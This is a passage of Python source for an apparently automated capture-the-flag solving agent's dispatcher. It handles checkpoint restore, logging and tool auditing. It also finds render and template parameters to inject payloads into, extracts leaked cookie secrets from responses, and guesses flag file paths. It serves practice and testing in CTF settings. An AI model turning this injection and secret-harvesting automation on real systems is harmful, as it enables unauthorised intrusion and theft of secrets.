                    "type": "strategy_memory_failure_recorded",
                    "entry_id": entry_id,
                    "payload": payload[:80],
                    "reason": reason[:120],
                }
            )

    def _restore_context(self) -> None:
        notes = get_all_notes_sync()
        self._emit(f"[CTF dispatcher] restored notes: {len(notes)} entries")
        if (
            self.state is None
            or self._checkpoint_store is None
            or not isinstance(self._challenge_context, dict)
        ):
            return
        resume_context = self._challenge_context.get("resumeContext")
        if not isinstance(resume_context, dict):
            return
        resume_run_id = str(resume_context.get("runId") or "").strip()
        resume_checkpoint_id = str(resume_context.get("checkpointId") or "").strip()
        if not resume_run_id:
            return
        if (
            self._restored_resume_checkpoint_id is not None
            and self._restored_resume_checkpoint_id == (resume_checkpoint_id or "__latest__")
        ):
            return
        record = (
            self._checkpoint_store.get_checkpoint(resume_run_id, resume_checkpoint_id)
            if resume_checkpoint_id
            else self._checkpoint_store.latest_checkpoint(resume_run_id)
        )
        if not isinstance(record, dict):
            return
        snapshot = record.get("state")
        if not isinstance(snapshot, dict):
            return
        try:
            restored_state = CTFState.from_snapshot(snapshot)
        except Exception:
            return
        restored_state.target = str(self.state.target or restored_state.target or "").strip()
        restored_state.goal = str(self.state.goal or restored_state.goal or "").strip()
        restored_state.local_challenge_auto_verify = (
            restored_state.local_challenge_auto_verify or self.state.local_challenge_auto_verify
        )
        if getattr(self.state, "capabilities", None):
            restored_state.capabilities = {
                **dict(restored_state.capabilities or {}),
                **dict(self.state.capabilities or {}),
            }
        self.state = restored_state
        self._restored_resume_checkpoint_id = str(
            resume_checkpoint_id or record.get("checkpoint_id") or "__latest__"
        ).strip() or "__latest__"
        self._emit(
            "[CTF dispatcher] restored checkpoint state: "
            f"run_id={resume_run_id} checkpoint_id={self._restored_resume_checkpoint_id}"
        )

    def _select_hypothesis_for_chain(self, chain_name: str):
        if self.state is None:
            return None
        for hypothesis in self.state.hypotheses:
            if _CHAIN_NAME_FOR_HYPOTHESIS.get(hypothesis.kind) == chain_name:
                return hypothesis
        return self.state.hypotheses[0] if self.state.hypotheses else None

    def _strategy_context(
        self,
        *,
        target: str,
        page_features: dict[str, Any],
        hint: str,
        extras: dict[str, Any] | None = None,
    ) -> StrategyContext:
        resolved_extras = dict(extras or {})
        if not resolved_extras.get("exploit_info"):
            if derived := self._recent_php_unserialize_source_exploit():
                resolved_extras.setdefault("exploit_info", derived.get("exploit_info") or {})
                resolved_extras.setdefault("artifact_url", str(derived.get("artifact_url") or ""))
        if not resolved_extras.get("cookie_secret") and self.state is not None:
            for observation in reversed(list(self.state.observations)):
                if str(getattr(observation, "kind", "") or "").strip() != "cookie_secret_leaked":
                    continue
                cookie_secret = str(getattr(observation, "value", "") or "").strip()
                if cookie_secret:
                    resolved_extras.setdefault("cookie_secret", cookie_secret)
                    break
        return StrategyContext(
            dispatcher=self,
            target=target,
            page_features=page_features,
            hint=hint,
            extras=resolved_extras,
            state=self.state,
            runtime=self.runtime,
            capability_registry=self.capability_registry,
            strategy_memory=self.strategy_memory,
            exploitation_mode=self.exploitation_mode,
        )

    def _strategies_for_chain(
        self,
        chain_name: str,
        *,
        target: str,
        page_features: dict[str, Any],
        hint: str,
        extras: dict[str, Any] | None = None,
    ):
        return self.strategy_registry.list_for_chain(
            chain_name,
            self._strategy_context(
                target=target,
                page_features=page_features,
                hint=hint,
                extras=extras,
            ),
        )

    def _collect_render_surface_urls(
        self,
        base: str,
        page_features: dict[str, Any],
    ) -> list[str]:
        candidates: list[str] = []
        seen: set[str] = set()
        seed_values = list(page_features.get("raw_links") or [])
        if self.state is not None:
            for observation in self.state.observations:
                if isinstance(observation.metadata, dict):
                    for key in ("url", "final_url"):
                        value = str(observation.metadata.get(key) or "").strip()
                        if value:
                            seed_values.append(value)
                    for item in list(observation.metadata.get("redirect_history") or []):
                        if isinstance(item, dict):
                            for key in ("url", "location"):
                                value = str(item.get(key) or "").strip()
                                if value:
                                    seed_values.append(value)
                seed_values.append(str(observation.value or "").strip())

        for raw in seed_values:
            text = str(raw or "").strip()
            if not text:
                continue
            absolute = urljoin(base + "/", text)
            parsed = urlparse(absolute)
            params = set(parse_qs(parsed.query).keys())
            if params.intersection({"msg", "message", "error", "render", "template"}):
                normalized = self._normalize_render_surface_url(absolute)
                if normalized not in seen:
                    seen.add(normalized)
                    candidates.append(normalized)
            elif "render" in text.lower() and urljoin(base + "/", "error?msg=Error") not in seen:
                fallback = urljoin(base + "/", "error?msg=Error")
                seen.add(fallback)
                candidates.append(fallback)

        fallback = urljoin(base + "/", "error?msg=Error")
        if fallback not in seen:
            candidates.append(fallback)
        return candidates

    def _normalize_render_surface_url(self, candidate_url: str) -> str:
        parsed = urlparse(candidate_url)
        params = parse_qs(parsed.query, keep_blank_values=True)
        normalized_keys = ("msg", "message", "error", "render", "template")
        changed = False
        for key in normalized_keys:
            if key in params:
                params[key] = ["Error"]
                changed = True
        if not changed:
            return candidate_url
        return parsed._replace(query=urlencode(params, doseq=True)).geturl()

    def _strategy_surface_signature(
        self,
        strategy_kind: str,
        values: list[str],
    ) -> str:
        normalized = [str(value or "").strip() for value in values if str(value or "").strip()]
        unique = sorted(dict.fromkeys(normalized))
        return f"{strategy_kind}::" + "||".join(unique)

    def _was_strategy_surface_exhausted(
        self,
        strategy_kind: str,
        signature: str,
    ) -> bool:
        if self.state is None:
            return False
        for observation in reversed(self.state.observations):
            if observation.kind != "strategy_surface_exhausted":
                continue
            metadata = observation.metadata if isinstance(observation.metadata, dict) else {}
            if str(metadata.get("strategy_kind") or "") != strategy_kind:
                continue
            if str(metadata.get("signature") or "") == signature:
                return True
        return False

    def _mark_strategy_surface_exhausted(
        self,
        strategy_kind: str,
        signature: str,
        **metadata: Any,
    ) -> None:
        if self.state is None:
            return
        if self._was_strategy_surface_exhausted(strategy_kind, signature):
            return
        self.state.add_observation(
            "strategy_surface_exhausted",
            strategy_kind,
            source="dispatcher",
            metadata={
                "strategy_kind": strategy_kind,
                "signature": signature,
                **metadata,
            },
        )

    def _response_fingerprint(self, body: str, status: int) -> str:
        plain = re.sub(r"<[^>]+>", " ", str(body or ""))
        normalized = re.sub(r"\s+", " ", plain).strip().lower()
        if len(normalized) > 80:
            normalized = normalized[:80]
        return f"{status}:{normalized}"

    def _inject_render_payload(self, candidate_url: str, payload: str) -> str:
        parsed = urlparse(candidate_url)
        params = parse_qs(parsed.query, keep_blank_values=True)
        for key in ("msg", "message", "error", "render", "template", "name"):
            if key in params:
                params[key] = [payload]
                return parsed._replace(query=urlencode(params, doseq=True)).geturl()
        params["msg"] = [payload]
        return parsed._replace(query=urlencode(params, doseq=True)).geturl()

    def _extract_cookie_secret_candidate(
        self,
        body: str,
        *,
        baseline_tokens: set[str] | None = None,
    ) -> str | None:
        plain = re.sub(r"<[^>]+>", " ", str(body or ""))
        known_tokens = set(baseline_tokens or set())
        common_skip = {
            "html", "body", "head", "title", "div", "span", "script", "style",
            "error", "file", "hash", "test", "probe", "true", "false", "null",
            "http", "https", "filehash", "filename", "handler", "settings",
            "cookie", "secret", "cookie_secret", "render", "msg", "message",
        }
        uuid_match = re.search(
            r"\b([0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12})\b",
            plain,
            re.IGNORECASE,
        )
        if uuid_match:
            return uuid_match.group(1)

        hex32_match = re.search(r"\b([0-9a-f]{32})\b", plain, re.IGNORECASE)
        if hex32_match and hex32_match.group(1) not in known_tokens:
            return hex32_match.group(1)

        for token in re.findall(r"[A-Za-z0-9_@#$%^&*!+\-]{4,64}", plain):
            if token in known_tokens:
                continue
            if token.lower() in common_skip:
                continue
            if token == "49":
                continue
            return token
        return None

    def _collect_candidate_filenames(self) -> list[str]:
        candidates: list[str] = ["/flag.txt", "/flag", "/flag.php", "/secret", "/hints.txt", "/index.php"]
        if self.state is None:
            return candidates
        sentence_patterns = (
            r"(?:flag|在|in|is\s+at|at|see|check|file\s+is)\s+([/][^\s<>\"']+)",
            r"(?:cat|view|read)\s+([/][^\s<>\"']+)",
        )
        for observation in self.state.observations:
            text = str(observation.value or "")
            for match in re.findall(r"(/[-A-Za-z0-9_./]{3,})", text):
                if not match.startswith("/"):
                    continue
                normalized = match.rstrip(".,;:!?)\"]'")
                if normalized and normalized not in candidates:
                    candidates.append(normalized)
            for pattern in sentence_patterns:
                for match in re.findall(pattern, text, flags=re.IGNORECASE):
                    normalized = str(match or "").strip().rstrip(".,;:!?)\"]'")
                    if normalized.startswith("/") and normalized not in candidates:
                        candidates.append(normalized)
            for candidate_url in re.findall(r"https?://[^\s\"'<>]+", text):
                parsed = urlparse(candidate_url)
                for values in parse_qs(parsed.query, keep_blank_values=True).values():
                    for value in values:
                        normalized = str(value or "").strip()
                        if not normalized or normalized.startswith("php://"):
                            continue
                        if not normalized.startswith("/"):
                            normalized = "/" + normalized.lstrip("/")
                        if normalized not in candidates:
                            candidates.append(normalized)
        return candidates

    def _emit(self, message: str) -> None:
        if self.progress_callback is not None:
            self.progress_callback(message)

    def _setup_session_ledger(
        self,
        *,
        run_id: str | None,
        ledger_root: str | Path | None,
    ) -> None:
        self._ledger_run_id = str(run_id or "").strip() or f"ctf-{uuid.uuid4().hex[:12]}"
        self._session_ledger = SessionLedger(ledger_root or (Path("loot") / "session_ledgers"))

    def _setup_artifact_registry(
        self,
        *,
        run_id: str | None,
        registry_root: str | Path | None,
    ) -> None:
        self._artifact_run_id = str(run_id or "").strip() or self._ledger_run_id
        if not self._artifact_run_id:
            self._artifact_run_id = f"ctf-{uuid.uuid4().hex[:12]}"
        self._artifact_registry = ArtifactRegistry(
            registry_root or (Path("loot") / "artifact_registry")
        )

    def _setup_checkpoint_store(
        self,
        *,
        run_id: str | None,
        checkpoint_root: str | Path | None,
    ) -> None:
        self._checkpoint_run_id = str(run_id or "").strip() or self._ledger_run_id
        if not self._checkpoint_run_id:
            self._checkpoint_run_id = f"ctf-{uuid.uuid4().hex[:12]}"
        self._checkpoint_store = CheckpointStore(
            checkpoint_root or (Path("loot") / "checkpoints")
        )

    def _record_session_event(
        self,
        event_type: str,
        payload: dict[str, Any] | None = None,
    ) -> None:
        if self._session_ledger is None or not self._ledger_run_id:
            return
        try:
            self._session_ledger.append_event(
                self._ledger_run_id,
                event_type,
                payload,
            )
        except Exception:
            pass

    def _write_checkpoint(
        self,
        label: str,
        metadata: dict[str, Any] | None = None,
    ) -> None:
        if self._checkpoint_store is None or not self._checkpoint_run_id or self.state is None:
            return
        try:
            record = self._checkpoint_store.save_checkpoint(
                run_id=self._checkpoint_run_id,
                label=label,
                state_snapshot=self.state.to_snapshot(),
                metadata=metadata,
            )
            checkpoint_event = build_checkpoint_written_event(record)
            self._record_session_event(
                str(checkpoint_event.get("event_type") or "checkpoint_written"),
                dict(checkpoint_event.get("payload") or {}),
            )
        except Exception:
            pass

    def _register_artifact_record(
        self,
        *,
        kind: str,
        title: str,
        path: str | None = None,
        location: str | None = None,
        producer: str = "",
        metadata: dict[str, Any] | None = None,
    ) -> None:
        if self._artifact_registry is None or not self._artifact_run_id:
            return
        try:
            record = self._artifact_registry.register_artifact(
                run_id=self._artifact_run_id,
                kind=kind,
                title=title,
                path=path,
                location=location,
                producer=producer,
                metadata=metadata,
            )
            artifact_event = build_artifact_registered_event(record)
            self._record_session_event(
                str(artifact_event.get("event_type") or "artifact_registered"),
                dict(artifact_event.get("payload") or {}),
            )
        except Exception:
            pass

    def _record_recovery_decision(self, decision: Any, *, chain_name: str = "") -> None:
        recovery_event = build_recovery_decision_event(decision, chain_name=chain_name)
        self._record_session_event(
            str(recovery_event.get("event_type") or "recovery_decision"),
            dict(recovery_event.get("payload") or {}),
        )

    def _resolve_registered_local_challenge_paths(self) -> tuple[Path | None, Path | None]:
        if self._artifact_registry is None or not self._artifact_run_id:
            return (None, None)
        try:
            records = self._artifact_registry.list_artifacts(self._artifact_run_id)
        except Exception:
            return (None, None)

        challenge_root: Path | None = None
        compose_file: Path | None = None
        for record in reversed(records):
            if not isinstance(record, dict):
                continue
            kind = str(record.get("kind") or "").strip()
            raw_path = str(record.get("path") or record.get("location") or "").strip()
            if not raw_path:
                continue
            candidate = Path(raw_path)
            if compose_file is None and kind == "local_challenge_compose_file" and candidate.is_file():
                compose_file = candidate
            if (
                challenge_root is None
                and kind in {"local_challenge_extracted_root", "local_challenge_root"}
                and candidate.is_dir()
            ):
                challenge_root = candidate
            if challenge_root is not None and compose_file is not None:
                break

        if challenge_root is None and compose_file is not None:
            challenge_root = compose_file.parent
        return (challenge_root, compose_file)

    def _resolve_registered_local_key_files(self) -> list[Path]:
        if self._artifact_registry is None or not self._artifact_run_id:
            return []
        try:
            records = self._artifact_registry.list_artifacts(self._artifact_run_id)
        except Exception:
            return []

        seen: set[str] = set()
        files: list[Path] = []
        for record in reversed(records):
            if not isinstance(record, dict):
                continue
            if str(record.get("kind") or "").strip() != "local_challenge_key_file":
                continue
            raw_path = str(record.get("path") or record.get("location") or "").strip()
            if not raw_path or raw_path in seen:
                continue
            candidate = Path(raw_path)
            if not candidate.exists() or not candidate.is_file():
                continue
            seen.add(raw_path)
            files.append(candidate)
        files.reverse()
        return files

    def _ingest_registered_local_source_hints(self, *, max_files: int = 3, max_chars: int = 400) -> None:
        if self.state is None:
            return
        if self._registered_local_source_hints_loaded:
            return
        for path in self._resolve_registered_local_key_files()[:max_files]:
            try:
                content = path.read_text(encoding="utf-8", errors="ignore")
            except Exception:
                continue
            snippet = str(content or "").strip()
            if not snippet:
                continue
            if len(snippet) > max_chars:
                snippet = snippet[: max_chars - 3].rstrip() + "..."
            self.state.add_observation(
                "local_challenge_source_hint",
                f"{path.name}: {snippet}",
                source="local_challenge_context",
                metadata={
                    "path": str(path),
                    "file_name": path.name,
                },
            )
        self._registered_local_source_hints_loaded = True

    async def _runtime_browser_action(
        self,
        action: str,
        *,
        audit_target: str,
        audit_metadata: dict[str, Any] | None = None,
        **kwargs: Any,
    ) -> Any:
        called_event = build_tool_called_event(
            tool_name="browser_action",
            action=action,
            target=audit_target,
            metadata=audit_metadata,
        )
        self._record_session_event(
            str(called_event.get("event_type") or "tool_called"),
            dict(called_event.get("payload") or {}),
        )
        result = await self.runtime.browser_action(action, **kwargs)
        finished_event = build_tool_finished_event(
            tool_name="browser_action",
            action=action,
            ok=isinstance(result, dict) and not bool(result.get("error")),
            status_code=result.get("status_code") if isinstance(result, dict) else None,
            target=audit_target,
            metadata=audit_metadata,
        )
        self._record_session_event(
            str(finished_event.get("event_type") or "tool_finished"),
            dict(finished_event.get("payload") or {}),
        )
        return result

    async def _runtime_proxy_action(
        self,
        action: str,
        *,
        audit_target: str,
        audit_metadata: dict[str, Any] | None = None,
        **kwargs: Any,
    ) -> Any:
        called_event = build_tool_called_event(
            tool_name="proxy_action",
            action=action,
            target=audit_target,
            metadata=audit_metadata,
        )
        self._record_session_event(
            str(called_event.get("event_type") or "tool_called"),
            dict(called_event.get("payload") or {}),
        )
        result = await self.runtime.proxy_action(action, **kwargs)
        finished_event = build_tool_finished_event(
            tool_name="proxy_action",
            action=action,
            ok=isinstance(result, dict) and not bool(result.get("error")),
            status_code=result.get("status_code") if isinstance(result, dict) else None,
            target=audit_target,
            metadata=audit_metadata,
        )
        self._record_session_event(
            str(finished_event.get("event_type") or "tool_finished"),
            dict(finished_event.get("payload") or {}),
        )
        return result

    async def _runtime_execute_command(
        self,
        command: str,
        *,
        timeout: int,
        audit_target: str,
        audit_metadata: dict[str, Any] | None = None,
    ) -> Any:
        called_metadata = dict(audit_metadata or {})
        called_metadata.setdefault("command", command[:240])
        called_event = build_tool_called_event(
            tool_name="execute_command",
            action="shell",
            target=audit_target,
            metadata=called_metadata,
        )
        self._record_session_event(
            str(called_event.get("event_type") or "tool_called"),
            dict(called_event.get("payload") or {}),
        )
        result = await self.runtime.execute_command(command, timeout=timeout)
        finished_metadata = dict(audit_metadata or {})
        finished_metadata.setdefault("command", command[:240])
        exit_code = getattr(result, "exit_code", None)
        finished_event = build_tool_finished_event(
            tool_name="execute_command",
            action="shell",
            ok=(exit_code is not None and int(exit_code) == 0),
            status_code=exit_code,
            target=audit_target,
            metadata=finished_metadata,
        )
        self._record_session_event(
            str(finished_event.get("event_type") or "tool_finished"),
            dict(finished_event.get("payload") or {}),
        )
        return result




__all__ = ["CTFTaskDispatcher", "SolveResult"]
